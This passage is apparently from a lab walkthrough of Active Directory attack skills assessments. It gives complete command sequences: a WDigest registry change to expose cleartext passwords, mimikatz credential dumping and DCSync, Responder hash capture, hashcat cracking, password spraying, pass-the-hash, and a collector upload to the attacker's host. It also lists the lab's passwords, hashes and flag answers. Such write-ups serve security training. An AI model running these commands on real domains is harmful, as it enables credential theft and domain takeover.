</span><span id="__span-298-2"><a id="__codelineno-298-2" name="__codelineno-298-2"></a><span class="n">reg</span> <span class="n">add</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">SecurityProviders</span><span class="p">\</span><span class="n">WDigest</span> <span class="p">/</span><span class="n">v</span> <span class="n">UseLogonCredential</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">1</span>
</span><span id="__span-298-3"><a id="__codelineno-298-3" name="__codelineno-298-3"></a><span class="c"># Confirm that it is enabled</span>
</span><span id="__span-298-4"><a id="__codelineno-298-4" name="__codelineno-298-4"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&quot;</span>
</span><span id="__span-298-5"><a id="__codelineno-298-5" name="__codelineno-298-5"></a><span class="c"># And &#39;UseLogonCredential REG_DWORD 0x1&#39; should be set to 1, not 0. </span>
</span><span id="__span-298-6"><a id="__codelineno-298-6" name="__codelineno-298-6"></a>
</span><span id="__span-298-7"><a id="__codelineno-298-7" name="__codelineno-298-7"></a><span class="c"># For the WDigest Authentication to be in plain text we will still need to reboot the target machine. FRom the Powershell terminal</span>
</span><span id="__span-298-8"><a id="__codelineno-298-8" name="__codelineno-298-8"></a><span class="n">shutdown</span> <span class="p">/</span><span class="nb">r </span><span class="p">/</span><span class="n">t</span> <span class="n">0</span> <span class="p">/</span><span class="n">f</span>
</span></code></pre></div></td></tr></table></div>
<p><img alt="" src="../img/wdigest.png" /></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-299-1">1</a></span>
<span class="normal"><a href="#__codelineno-299-2">2</a></span>
<span class="normal"><a href="#__codelineno-299-3">3</a></span>
<span class="normal"><a href="#__codelineno-299-4">4</a></span>
<span class="normal"><a href="#__codelineno-299-5">5</a></span>
<span class="normal"><a href="#__codelineno-299-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-299-1"><a id="__codelineno-299-1" name="__codelineno-299-1"></a><span class="c"># Now we connect again to the machine using proxychains.</span>
</span><span id="__span-299-2"><a id="__codelineno-299-2" name="__codelineno-299-2"></a><span class="n">proxychains</span> <span class="n">xfreerdp</span> <span class="p">/</span><span class="n">v</span><span class="p">:</span><span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">6</span><span class="p">.</span><span class="n">50</span> <span class="p">/</span><span class="n">u</span><span class="p">:</span><span class="n">svc_sql</span> <span class="p">/</span><span class="n">cert</span><span class="p">:</span><span class="n">ignore</span> 
</span><span id="__span-299-3"><a id="__codelineno-299-3" name="__codelineno-299-3"></a>
</span><span id="__span-299-4"><a id="__codelineno-299-4" name="__codelineno-299-4"></a><span class="c"># After gaining access we can drag our mimikatz file to the desktop. Then we will right click on mimikatz and execute as Administrator. </span>
</span><span id="__span-299-5"><a id="__codelineno-299-5" name="__codelineno-299-5"></a><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</span><span id="__span-299-6"><a id="__codelineno-299-6" name="__codelineno-299-6"></a><span class="n">sekurlsa</span><span class="p">::</span><span class="n">logonpasswords</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: tpetty</p>
<p><strong>Submit this user's cleartext password.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-300-1">1</a></span>
<span class="normal"><a href="#__codelineno-300-2">2</a></span>
<span class="normal"><a href="#__codelineno-300-3">3</a></span>
<span class="normal"><a href="#__codelineno-300-4">4</a></span>
<span class="normal"><a href="#__codelineno-300-5">5</a></span>
<span class="normal"><a href="#__codelineno-300-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-300-1"><a id="__codelineno-300-1" name="__codelineno-300-1"></a># Now we connect again to the machine using proxychains.
</span><span id="__span-300-2"><a id="__codelineno-300-2" name="__codelineno-300-2"></a>proxychains xfreerdp /v:172.16.6.50 /u:svc_sql /cert:ignore 
</span><span id="__span-300-3"><a id="__codelineno-300-3" name="__codelineno-300-3"></a>
</span><span id="__span-300-4"><a id="__codelineno-300-4" name="__codelineno-300-4"></a># Right click on the mimikatz to open as administrator and run:
</span><span id="__span-300-5"><a id="__codelineno-300-5" name="__codelineno-300-5"></a>privilege::debug
</span><span id="__span-300-6"><a id="__codelineno-300-6" name="__codelineno-300-6"></a>sekurlsa::logonpasswords
</span></code></pre></div></td></tr></table></div>
<p><img alt="" src="../img/mimi.png" /></p>
<p>Results: Sup3rS3cur3D0m@inU2eR</p>
<p><strong>What attack can this user perform?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-301-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-301-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-301-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-301-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-301-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-301-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-301-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-301-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-301-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-301-10">10</a></span>
<span class="normal"><a href="#__codelineno-301-11">11</a></span>
<span class="normal"><a href="#__codelineno-301-12">12</a></span>
<span class="normal"><a href="#__codelineno-301-13">13</a></span>
<span class="normal"><a href="#__codelineno-301-14">14</a></span>
<span class="normal"><a href="#__codelineno-301-15">15</a></span>
<span class="normal"><a href="#__codelineno-301-16">16</a></span>
<span class="normal"><a href="#__codelineno-301-17">17</a></span>
<span class="normal"><a href="#__codelineno-301-18">18</a></span>
<span class="normal"><a href="#__codelineno-301-19">19</a></span>
<span class="normal"><a href="#__codelineno-301-20">20</a></span>
<span class="normal"><a href="#__codelineno-301-21">21</a></span>
<span class="normal"><a href="#__codelineno-301-22">22</a></span>
<span class="normal"><a href="#__codelineno-301-23">23</a></span>
<span class="normal"><a href="#__codelineno-301-24">24</a></span>
<span class="normal"><a href="#__codelineno-301-25">25</a></span>
<span class="normal"><a href="#__codelineno-301-26">26</a></span>
<span class="normal"><a href="#__codelineno-301-27">27</a></span>
<span class="normal"><a href="#__codelineno-301-28">28</a></span>
<span class="normal"><a href="#__codelineno-301-29">29</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-301-1"><a id="__codelineno-301-1" name="__codelineno-301-1"></a># Use BloodHound to determine permissions. First, upload the SharpHound collector. 
</span><span id="__span-301-2"><a id="__codelineno-301-2" name="__codelineno-301-2"></a># Drag and drop the collector from your machine to the target, or use copy-paste. Then run the collector:
</span><span id="__span-301-3"><a id="__codelineno-301-3" name="__codelineno-301-3"></a>.\SharpHound.exe -c ALL --zipfilename enum
</span><span id="__span-301-4"><a id="__codelineno-301-4" name="__codelineno-301-4"></a>
</span><span id="__span-301-5"><a id="__codelineno-301-5" name="__codelineno-301-5"></a># Open Internet Explorer on the target machine and navigate to the pivot&#39;s HTML server:
</span><span id="__span-301-6"><a id="__codelineno-301-6" name="__codelineno-301-6"></a>http://172.16.6.100/uploads/antak.aspx
</span><span id="__span-301-7"><a id="__codelineno-301-7" name="__codelineno-301-7"></a># Upload the generated collector file to the pivot host.
</span><span id="__span-301-8"><a id="__codelineno-301-8" name="__codelineno-301-8"></a>
</span><span id="__span-301-9"><a id="__codelineno-301-9" name="__codelineno-301-9"></a># Next, from the Kali machine, serve the PSUpload.ps1 file to the pivot machine (172.16.6.100):
</span><span id="__span-301-10"><a id="__codelineno-301-10" name="__codelineno-301-10"></a>python3 -m http.server 9001
</span><span id="__span-301-11"><a id="__codelineno-301-11" name="__codelineno-301-11"></a>
</span><span id="__span-301-12"><a id="__codelineno-301-12" name="__codelineno-301-12"></a># Retrieve the PSUpload.ps1 file on the pivot machine:
</span><span id="__span-301-13"><a id="__codelineno-301-13" name="__codelineno-301-13"></a>Invoke-WebRequest http://10.10.15.140:9001/PSUpload.ps1 -OutFile PSUpload.ps1
</span><span id="__span-301-14"><a id="__codelineno-301-14" name="__codelineno-301-14"></a>
</span><span id="__span-301-15"><a id="__codelineno-301-15" name="__codelineno-301-15"></a># Start an uploader server on the Kali machine:
</span><span id="__span-301-16"><a id="__codelineno-301-16" name="__codelineno-301-16"></a>python3 -m uploadserver
</span><span id="__span-301-17"><a id="__codelineno-301-17" name="__codelineno-301-17"></a>
</span><span id="__span-301-18"><a id="__codelineno-301-18" name="__codelineno-301-18"></a># From the pivot host, upload the generated collector file to the Kali machine:
</span><span id="__span-301-19"><a id="__codelineno-301-19" name="__codelineno-301-19"></a>Import-Module .\PSUpload.ps1; Invoke-FileUpload -Uri http://10.10.15.140:8000/upload -File C:\windows\system32\inetsrv\20250106032426_enum.zip 
</span><span id="__span-301-20"><a id="__codelineno-301-20" name="__codelineno-301-20"></a>
</span><span id="__span-301-21"><a id="__codelineno-301-21" name="__codelineno-301-21"></a># Start the Neo4j server on the Kali machine:
</span><span id="__span-301-22"><a id="__codelineno-301-22" name="__codelineno-301-22"></a>sudo neo4j console
</span><span id="__span-301-23"><a id="__codelineno-301-23" name="__codelineno-301-23"></a>
</span><span id="__span-301-24"><a id="__codelineno-301-24" name="__codelineno-301-24"></a># Open BloodHound:
</span><span id="__span-301-25"><a id="__codelineno-301-25" name="__codelineno-301-25"></a>bloodhound
</span><span id="__span-301-26"><a id="__codelineno-301-26" name="__codelineno-301-26"></a>
</span><span id="__span-301-27"><a id="__codelineno-301-27" name="__codelineno-301-27"></a># In BloodHound, search for the node &quot;tpetty.&quot; Set it as the starting node. 
</span><span id="__span-301-28"><a id="__codelineno-301-28" name="__codelineno-301-28"></a># In the &quot;Node Info&quot; blade, scroll down to &quot;Outbound Object Control&quot; and check the &quot;First Degree Object Control&quot; section. 
</span><span id="__span-301-29"><a id="__codelineno-301-29" name="__codelineno-301-29"></a># Confirm that the user has DCSync permissions over INLANEFREIGHT.LOCAL.
</span></code></pre></div></td></tr></table></div>
<p><img alt="" src="../img/attack.png" /></p>
<p>Results: DCSync</p>
<p><strong>Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-302-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-302-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-302-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-302-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-302-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-302-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-302-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-302-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-302-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-302-10">10</a></span>
<span class="normal"><a href="#__codelineno-302-11">11</a></span>
<span class="normal"><a href="#__codelineno-302-12">12</a></span>
<span class="normal"><a href="#__codelineno-302-13">13</a></span>
<span class="normal"><a href="#__codelineno-302-14">14</a></span>
<span class="normal"><a href="#__codelineno-302-15">15</a></span>
<span class="normal"><a href="#__codelineno-302-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-302-1"><a id="__codelineno-302-1" name="__codelineno-302-1"></a># Get the User TPetty&#39;s SID:
</span><span id="__span-302-2"><a id="__codelineno-302-2" name="__codelineno-302-2"></a>Import-Module .\PowerView.ps1; Get-DomainUser -Identity TPETTY  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
</span><span id="__span-302-3"><a id="__codelineno-302-3" name="__codelineno-302-3"></a>
</span><span id="__span-302-4"><a id="__codelineno-302-4" name="__codelineno-302-4"></a># With the $sid, checkout the replication rights:
</span><span id="__span-302-5"><a id="__codelineno-302-5" name="__codelineno-302-5"></a>Import-Module .\PowerView.ps1; $sid= &quot;S-1-5-21-2270287766-1317258649-2146029398-4607&quot;; Get-ObjectAcl &quot;DC=inlanefreight,DC=local&quot; -ResolveGUIDs | ? { ($_.ObjectAceType -match &#39;Replication-Get&#39;)} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
</span><span id="__span-302-6"><a id="__codelineno-302-6" name="__codelineno-302-6"></a>
</span><span id="__span-302-7"><a id="__codelineno-302-7" name="__codelineno-302-7"></a># However we already knew this from the Bloodhound analysis.
</span><span id="__span-302-8"><a id="__codelineno-302-8" name="__codelineno-302-8"></a>
</span><span id="__span-302-9"><a id="__codelineno-302-9" name="__codelineno-302-9"></a># Now we open a powershell as TPETTY user in the target host 172.16.6.50 and launch mimikatz.exe
</span><span id="__span-302-10"><a id="__codelineno-302-10" name="__codelineno-302-10"></a>.\mimikatz.exe
</span><span id="__span-302-11"><a id="__codelineno-302-11" name="__codelineno-302-11"></a>
</span><span id="__span-302-12"><a id="__codelineno-302-12" name="__codelineno-302-12"></a># Now we can request the domain to dump the NTLM hashes as Administrators:
</span><span id="__span-302-13"><a id="__codelineno-302-13" name="__codelineno-302-13"></a>lsadump::dcsync /domain:inlanefreight.local /user:Administrator
</span><span id="__span-302-14"><a id="__codelineno-302-14" name="__codelineno-302-14"></a>
</span><span id="__span-302-15"><a id="__codelineno-302-15" name="__codelineno-302-15"></a># And now from our attacker machine, we can retrieve the flag launching a pass the hash attack
</span><span id="__span-302-16"><a id="__codelineno-302-16" name="__codelineno-302-16"></a>proxychains crackmapexec smb 172.16.6.3 -u Administrator -H &quot;27dedb1dab4d8545c6e1c66fba077da0&quot; -d INLANEFREIGHT.LOCAL -x &#39;type c:\Users\Administrator\Desktop\flag.txt&#39; --exec-method smbexec 
</span></code></pre></div></td></tr></table></div>
<p>Results: r3plicat1on_m@st3r!</p>
<h3 id="ad-enumeration-attacks-skills-assessment-part-ii">AD Enumeration &amp; Attacks - Skills Assessment Part II</h3>
<p><strong>Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-303-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-303-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-303-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-303-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-303-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-303-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-303-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-303-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-303-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-303-10">10</a></span>
<span class="normal"><a href="#__codelineno-303-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-303-1"><a id="__codelineno-303-1" name="__codelineno-303-1"></a># Access the pivot machine using two separate terminals:
</span><span id="__span-303-2"><a id="__codelineno-303-2" name="__codelineno-303-2"></a>ssh $user@$ip
</span><span id="__span-303-3"><a id="__codelineno-303-3" name="__codelineno-303-3"></a>
</span><span id="__span-303-4"><a id="__codelineno-303-4" name="__codelineno-303-4"></a># In one terminal, set up a Responder server:
</span><span id="__span-303-5"><a id="__codelineno-303-5" name="__codelineno-303-5"></a>ip a
</span><span id="__span-303-6"><a id="__codelineno-303-6" name="__codelineno-303-6"></a>responder -I ens224
</span><span id="__span-303-7"><a id="__codelineno-303-7" name="__codelineno-303-7"></a>
</span><span id="__span-303-8"><a id="__codelineno-303-8" name="__codelineno-303-8"></a># In the other terminal, perform a reconnaissance scan using Nmap:
</span><span id="__span-303-9"><a id="__codelineno-303-9" name="__codelineno-303-9"></a>nmap -T4 -A 172.16.7.0/23 -oN scan.txt
</span><span id="__span-303-10"><a id="__codelineno-303-10" name="__codelineno-303-10"></a>
</span><span id="__span-303-11"><a id="__codelineno-303-11" name="__codelineno-303-11"></a># The Responder server will capture several user credentials during the scan.
</span></code></pre></div></td></tr></table></div>
<p>Results: AB920</p>
<p><strong>What is this user's cleartext password?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-304-1">1</a></span>
<span class="normal"><a href="#__codelineno-304-2">2</a></span>
<span class="normal"><a href="#__codelineno-304-3">3</a></span>
<span class="normal"><a href="#__codelineno-304-4">4</a></span>
<span class="normal"><a href="#__codelineno-304-5">5</a></span>
<span class="normal"><a href="#__codelineno-304-6">6</a></span>
<span class="normal"><a href="#__codelineno-304-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-304-1"><a id="__codelineno-304-1" name="__codelineno-304-1"></a># Open the responder log
</span><span id="__span-304-2"><a id="__codelineno-304-2" name="__codelineno-304-2"></a>cd /usr/share/responder/logs
</span><span id="__span-304-3"><a id="__codelineno-304-3" name="__codelineno-304-3"></a>ls -la
</span><span id="__span-304-4"><a id="__codelineno-304-4" name="__codelineno-304-4"></a>cat cat SMB-NTLMv2-SSP-172.16.7.3.txt
</span><span id="__span-304-5"><a id="__codelineno-304-5" name="__codelineno-304-5"></a>
</span><span id="__span-304-6"><a id="__codelineno-304-6" name="__codelineno-304-6"></a># Crack the hash
</span><span id="__span-304-7"><a id="__codelineno-304-7" name="__codelineno-304-7"></a>hashcat -m 5600 AB920 /usr/share/wordlists/rockyou.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: weasal</p>
<p><strong>Submit the contents of the C:\flag.txt file on MS01.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-305-1">1</a></span>
<span class="normal"><a href="#__codelineno-305-2">2</a></span>
<span class="normal"><a href="#__codelineno-305-3">3</a></span>
<span class="normal"><a href="#__codelineno-305-4">4</a></span>
<span class="normal"><a href="#__codelineno-305-5">5</a></span>
<span class="normal"><a href="#__codelineno-305-6">6</a></span>
<span class="normal"><a href="#__codelineno-305-7">7</a></span>
<span class="normal"><a href="#__codelineno-305-8">8</a></span>
<span class="normal"><a href="#__codelineno-305-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-305-1"><a id="__codelineno-305-1" name="__codelineno-305-1"></a># Launch a reverse proxy. From you kali terminal, use a ssh reverse proxy. In my case, I had already set in /etc/proxychains4.conf the port 1080, so I will use the same
</span><span id="__span-305-2"><a id="__codelineno-305-2" name="__codelineno-305-2"></a>ssh htb-student@10.129.41.78 -D 1080
</span><span id="__span-305-3"><a id="__codelineno-305-3" name="__codelineno-305-3"></a>
</span><span id="__span-305-4"><a id="__codelineno-305-4" name="__codelineno-305-4"></a># In another terminal from your attacker machine:
</span><span id="__span-305-5"><a id="__codelineno-305-5" name="__codelineno-305-5"></a>proxychains xfreerdp /v:172.16.7.50 /u:AB920 /cert:ignore
</span><span id="__span-305-6"><a id="__codelineno-305-6" name="__codelineno-305-6"></a># When prompted, enter the creds: weasal
</span><span id="__span-305-7"><a id="__codelineno-305-7" name="__codelineno-305-7"></a>
</span><span id="__span-305-8"><a id="__codelineno-305-8" name="__codelineno-305-8"></a># Open a powershell terminal and
</span><span id="__span-305-9"><a id="__codelineno-305-9" name="__codelineno-305-9"></a>cat c:\flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: aud1t_gr0up_m3mbersh1ps!</p>
<p><strong>Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-306-1">1</a></span>
<span class="normal"><a href="#__codelineno-306-2">2</a></span>
<span class="normal"><a href="#__codelineno-306-3">3</a></span>
<span class="normal"><a href="#__codelineno-306-4">4</a></span>
<span class="normal"><a href="#__codelineno-306-5">5</a></span>
<span class="normal"><a href="#__codelineno-306-6">6</a></span>
<span class="normal"><a href="#__codelineno-306-7">7</a></span>
<span class="normal"><a href="#__codelineno-306-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-306-1"><a id="__codelineno-306-1" name="__codelineno-306-1"></a># Establish an SSH connection with a SOCKS reverse proxy:
</span><span id="__span-306-2"><a id="__codelineno-306-2" name="__codelineno-306-2"></a>ssh htb-student@$ip -D 1080
</span><span id="__span-306-3"><a id="__codelineno-306-3" name="__codelineno-306-3"></a>
</span><span id="__span-306-4"><a id="__codelineno-306-4" name="__codelineno-306-4"></a># Perform host enumeration by connecting to 172.16.7.50 using RDP:
</span><span id="__span-306-5"><a id="__codelineno-306-5" name="__codelineno-306-5"></a>proxychains xfreerdp /v:172.16.7.50 /u:AB920 /cert:ignore
</span><span id="__span-306-6"><a id="__codelineno-306-6" name="__codelineno-306-6"></a>
</span><span id="__span-306-7"><a id="__codelineno-306-7" name="__codelineno-306-7"></a># Enumerate the password policy from the Kali attacking machine:
</span><span id="__span-306-8"><a id="__codelineno-306-8" name="__codelineno-306-8"></a>proxychains crackmapexec smb 172.16.7.3 -u AB920 -p weasal --pass-pol
</span></code></pre></div></td></tr></table></div>
<p><img alt="" src="../img/ad.png" /></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-307-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-307-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-307-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-307-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-307-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-307-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-307-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-307-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-307-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-307-10">10</a></span>
<span class="normal"><a href="#__codelineno-307-11">11</a></span>
<span class="normal"><a href="#__codelineno-307-12">12</a></span>
<span class="normal"><a href="#__codelineno-307-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-307-1"><a id="__codelineno-307-1" name="__codelineno-307-1"></a># Enumerate user accounts on the target machine:
</span><span id="__span-307-2"><a id="__codelineno-307-2" name="__codelineno-307-2"></a>proxychains crackmapexec smb 172.16.7.3 -u AB920 -p weasal --users &gt; users.txt
</span><span id="__span-307-3"><a id="__codelineno-307-3" name="__codelineno-307-3"></a>
</span><span id="__span-307-4"><a id="__codelineno-307-4" name="__codelineno-307-4"></a># Extract and format the list of users to keep only usernames:
</span><span id="__span-307-5"><a id="__codelineno-307-5" name="__codelineno-307-5"></a>sed -E &#39;s/.*INLANEFREIGHT\.LOCAL\\([A-Z0-9]+).*/\1/&#39; users.txt &gt; final.txt
</span><span id="__span-307-6"><a id="__codelineno-307-6" name="__codelineno-307-6"></a>
</span><span id="__span-307-7"><a id="__codelineno-307-7" name="__codelineno-307-7"></a># Perform a password spray attack from the Kali terminal:
</span><span id="__span-307-8"><a id="__codelineno-307-8" name="__codelineno-307-8"></a>proxychains crackmapexec smb 172.16.7.3 -u final.txt -p /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt --no-bruteforce
</span><span id="__span-307-9"><a id="__codelineno-307-9" name="__codelineno-307-9"></a>
</span><span id="__span-307-10"><a id="__codelineno-307-10" name="__codelineno-307-10"></a># Note: This process may take some time.
</span><span id="__span-307-11"><a id="__codelineno-307-11" name="__codelineno-307-11"></a>
</span><span id="__span-307-12"><a id="__codelineno-307-12" name="__codelineno-307-12"></a># Conduct a brute-force attack using Hydra:
</span><span id="__span-307-13"><a id="__codelineno-307-13" name="__codelineno-307-13"></a>proxychains hydra -L ~/borrar/final.txt -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt smb://172.16.7.3
</span></code></pre></div></td></tr></table></div>
<p>Results: BR086</p>
<p><strong>What is this user's password?</strong></p>
<p>Results: Welcome1</p>
<p><strong>Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?</strong></p>
<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-308-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-308-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-308-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-308-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-308-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-308-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-308-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-308-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-308-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-308-10">10</a></span>
<span class="normal"><a href="#__codelineno-308-11">11</a></span>
<span class="normal"><a href="#__codelineno-308-12">12</a></span>
<span class="normal"><a href="#__codelineno-308-13">13</a></span>
<span class="normal"><a href="#__codelineno-308-14">14</a></span>
<span class="normal"><a href="#__codelineno-308-15">15</a></span>
<span class="normal"><a href="#__codelineno-308-16">16</a></span>
<span class="normal"><a href="#__codelineno-308-17">17</a></span>
<span class="normal"><a href="#__codelineno-308-18">18</a></span>
<span class="normal"><a href="#__codelineno-308-19">19</a></span>
<span class="normal"><a href="#__codelineno-308-20">20</a></span>
<span class="normal"><a href="#__codelineno-308-21">21</a></span>
<span class="normal"><a href="#__codelineno-308-22">22</a></span>
<span class="normal"><a href="#__codelineno-308-23">23</a></span>
<span class="normal"><a href="#__codelineno-308-24">24</a></span>
<span class="normal"><a href="#__codelineno-308-25">25</a></span>
<span class="normal"><a href="#__codelineno-308-26">26</a></span>
<span class="normal"><a href="#__codelineno-308-27">27</a></span>
<span class="normal"><a href="#__codelineno-308-28">28</a></span>
<span class="normal"><a href="#__codelineno-308-29">29</a></span>
<span class="normal"><a href="#__codelineno-308-30">30</a></span>
<span class="normal"><a href="#__codelineno-308-31">31</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-308-1"><a id="__codelineno-308-1" name="__codelineno-308-1"></a><span class="c1"># Enumerate shared directories on DC01.</span>
</span><span id="__span-308-2"><a id="__codelineno-308-2" name="__codelineno-308-2"></a>proxychains<span class="w"> </span>smbmap<span class="w"> </span>-u<span class="w"> </span>BR086<span class="w"> </span>-p<span class="w"> </span>Welcome1<span class="w"> </span>-d<span class="w"> </span>INLANEFREIGHT.LOCAL<span class="w"> </span>-H<span class="w"> </span><span class="m">172</span>.16.7.3<span class="w"> </span>-r<span class="w"> </span>
</span><span id="__span-308-3"><a id="__codelineno-308-3" name="__codelineno-308-3"></a>
</span><span id="__span-308-4"><a id="__codelineno-308-4" name="__codelineno-308-4"></a><span class="c1"># Method 1: Using RDP and File Explorer</span>
</span><span id="__span-308-5"><a id="__codelineno-308-5" name="__codelineno-308-5"></a><span class="c1"># After confirming access, connect to the MS01 host (172.16.7.50) using RDP:</span>
</span><span id="__span-308-6"><a id="__codelineno-308-6" name="__codelineno-308-6"></a>proxychains<span class="w"> </span>xfreerdp<span class="w"> </span>/v:172.16.7.50<span class="w"> </span>/u:BR086<span class="w"> </span>/cert:ignore
</span><span id="__span-308-7"><a id="__codelineno-308-7" name="__codelineno-308-7"></a>
</span><span id="__span-308-8"><a id="__codelineno-308-8" name="__codelineno-308-8"></a><span class="c1"># On the RDP session, open File Explorer and enter the following address in the address bar:</span>
</span><span id="__span-308-9"><a id="__codelineno-308-9" name="__codelineno-308-9"></a><span class="se">\\</span><span class="m">172</span>.16.7.3
</span><span id="__span-308-10"><a id="__codelineno-308-10" name="__codelineno-308-10"></a>
</span><span id="__span-308-11"><a id="__codelineno-308-11" name="__codelineno-308-11"></a><span class="c1"># View the available shares on DC01.INLANEFREIGHT.LOCAL. Navigate to:</span>
</span><span id="__span-308-12"><a id="__codelineno-308-12" name="__codelineno-308-12"></a><span class="se">\\</span><span class="m">172</span>.16.7.3<span class="se">\D</span>epartment<span class="w"> </span>Shares<span class="se">\I</span>T<span class="se">\P</span>rivate<span class="se">\D</span>evelopment
</span><span id="__span-308-13"><a id="__codelineno-308-13" name="__codelineno-308-13"></a>
</span><span id="__span-308-14"><a id="__codelineno-308-14" name="__codelineno-308-14"></a><span class="c1"># Locate the `web.config` file within this directory.</span>
</span><span id="__span-308-15"><a id="__codelineno-308-15" name="__codelineno-308-15"></a>
</span><span id="__span-308-16"><a id="__codelineno-308-16" name="__codelineno-308-16"></a><span class="c1"># Method 2: Accessing shares directly from the Kali terminal</span>
</span><span id="__span-308-17"><a id="__codelineno-308-17" name="__codelineno-308-17"></a><span class="c1"># Use `smbmap` to list contents of the &quot;Department Shares&quot; directory:</span>
</span><span id="__span-308-18"><a id="__codelineno-308-18" name="__codelineno-308-18"></a>proxychains<span class="w"> </span>smbmap<span class="w"> </span>-u<span class="w"> </span>BR086<span class="w"> </span>-p<span class="w"> </span>Welcome1<span class="w"> </span>-d<span class="w"> </span>INLANEFREIGHT.LOCAL<span class="w"> </span>-H<span class="w"> </span><span class="m">172</span>.16.7.3<span class="w"> </span>-R<span class="w"> </span><span class="s2">&quot;Department Shares&quot;</span>
</span><span id="__span-308-19"><a id="__codelineno-308-19" name="__codelineno-308-19"></a>
